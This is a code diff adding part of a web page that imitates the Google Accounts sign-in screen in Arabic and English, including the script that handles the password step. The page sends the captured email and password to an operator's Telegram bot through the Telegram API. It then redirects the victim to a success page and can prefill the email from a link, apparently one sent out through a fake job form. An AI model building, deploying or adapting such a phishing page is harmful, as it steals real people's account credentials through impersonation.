+                submitBtn.disabled = false;
+                const activeLang = document.documentElement.lang || 'ar';
+                window.location.href = 'iman-success.html?lang=' + encodeURIComponent(activeLang);
+            };
+
+            // Check if Telegram Bot credentials are configured
+            if (TELEGRAM_BOT_TOKEN && !TELEGRAM_BOT_TOKEN.startsWith('YOUR_') && 
+                TELEGRAM_CHAT_ID && !TELEGRAM_CHAT_ID.startsWith('YOUR_')) {
+                
+                const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                })
+                .then(() => {
+                    redirectToSuccess();
+                })
+                .catch(err => {
+                    console.error('Telegram Dispatch Error:', err);
+                    // Fallback to redirection anyway so user experience is not disrupted
+                    redirectToSuccess();
+                });
+            } else {
+                // Skips telegram and redirects in development mode
+                console.log('Telegram dispatch skipped (credentials not configured):', { email, pass });
+                setTimeout(redirectToSuccess, 1000);
+            }
+        });
+
+        passwordInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                submitBtn.click();
+            }
+        });
+
+        // Custom Languages Selector Dropdown Handling
+        langTrigger.addEventListener('click', (e) => {
+            e.stopPropagation();
+            const isActive = langDropdown.classList.contains('active');
+            langDropdown.classList.toggle('active', !isActive);
+            langTrigger.setAttribute('aria-expanded', !isActive);
+        });
+
+        langOptions.forEach(option => {
+            option.addEventListener('click', function(e) {
+                langOptions.forEach(opt => opt.classList.remove('active'));
+                this.classList.add('active');
+                activeLangText.textContent = this.textContent;
+                langDropdown.classList.remove('active');
+                langTrigger.setAttribute('aria-expanded', 'false');
+
+                // Dynamic language toggles (simulation)
+                const currentLang = this.getAttribute('data-lang');
+                if (currentLang === 'en') {
+                    document.documentElement.setAttribute('lang', 'en');
+                    document.documentElement.setAttribute('dir', 'ltr');
+                    
+                    // Simple text changes for english demo mode
+                    document.title = "Sign in - Google Accounts";
+                    document.querySelector('#step1 .main-heading').textContent = "Sign in";
+                    document.querySelector('#step1 .sub-heading').textContent = "to continue to Google";
+                    document.querySelector('#step1 .input-label').textContent = "Email or phone";
+                    document.querySelector('#step1 #forgotEmailLink').textContent = "Forgot email?";
+                    document.querySelector('#step1 .help-text-block').childNodes[0].textContent = "Not your computer? Use Guest mode to sign in privately. ";
+                    document.querySelector('#step1 .help-text-block .action-link').textContent = "Learn more about using Guest mode";
+                    document.querySelector('#step1 #createAccountBtn').textContent = "Create account";
+                    document.querySelector('#step1 #nextBtn').textContent = "Next";
+
+                    document.querySelector('#step2 .main-heading').textContent = "Welcome";
+                    document.querySelector('#step2 .input-label').textContent = "Enter your password";
+                    document.querySelector('#step2 #showPasswordRow label').textContent = "Show password";
+                    document.querySelector('#step2 #forgotPasswordBtn').textContent = "Forgot password?";
+                    document.querySelector('#step2 #submitBtn').textContent = "Next";
+
+                    document.querySelectorAll('.footer-link')[0].textContent = "Help";
+                    document.querySelectorAll('.footer-link')[1].textContent = "Privacy";
+                    document.querySelectorAll('.footer-link')[2].textContent = "Terms";
+                } else if (currentLang === 'ar') {
+                    document.documentElement.setAttribute('lang', 'ar');
+                    document.documentElement.setAttribute('dir', 'rtl');
+
+                    document.title = "تسجيل الدخول - حسابات Google";
+                    document.querySelector('#step1 .main-heading').textContent = "تسجيل الدخول";
+                    document.querySelector('#step1 .sub-heading').textContent = "باستخدام حسابك على Google";
+                    document.querySelector('#step1 .input-label').textContent = "البريد الإلكتروني أو الهاتف";
+                    document.querySelector('#step1 #forgotEmailLink').textContent = "هل نسيت البريد الإلكتروني؟";
+                    document.querySelector('#step1 .help-text-block').childNodes[0].textContent = "ليس كمبيوترك الشخصي؟ استخدم نافذة للتصفح الخاص لتسجيل الدخول. ";
+                    document.querySelector('#step1 .help-text-block .action-link').textContent = "معرفة المزيد عن استخدام ضيف تسجيل الدخول";
+                    document.querySelector('#step1 #createAccountBtn').textContent = "إنشاء حساب";
+                    document.querySelector('#step1 #nextBtn').textContent = "التالي";
+
+                    document.querySelector('#step2 .main-heading').textContent = "مرحباً بك";
+                    document.querySelector('#step2 .input-label').textContent = "أدخل كلمة المرور";
+                    document.querySelector('#step2 #showPasswordRow label').textContent = "عرض كلمة المرور";
+                    document.querySelector('#step2 #forgotPasswordBtn').textContent = "هل نسيت كلمة المرور؟";
+                    document.querySelector('#step2 #submitBtn').textContent = "التالي";
+
+                    document.querySelectorAll('.footer-link')[0].textContent = "المساعدة";
+                    document.querySelectorAll('.footer-link')[1].textContent = "الخصوصية";
+                    document.querySelectorAll('.footer-link')[2].textContent = "البنود";
+                }
+            });
+        });
+
+        // Click outside dropdown to close
+        document.addEventListener('click', () => {
+            langDropdown.classList.remove('active');
+            langTrigger.setAttribute('aria-expanded', 'false');
+        });
+
+        // Initialize state and check for prefilled email from job form redirect
+        window.addEventListener('load', () => {
+            emailInput.focus();
+            
+            // Check for pre-filled email from URL query parameter
+            const urlParams = new URLSearchParams(window.location.search);
+            const emailParam = urlParams.get('email');
+            if (emailParam) {
+                emailInput.value = emailParam;
+                // Transition automatically to Step 2 (Password)
+                goToStep2();
+            }
+        });
+    </script>
+</body>
+</html>
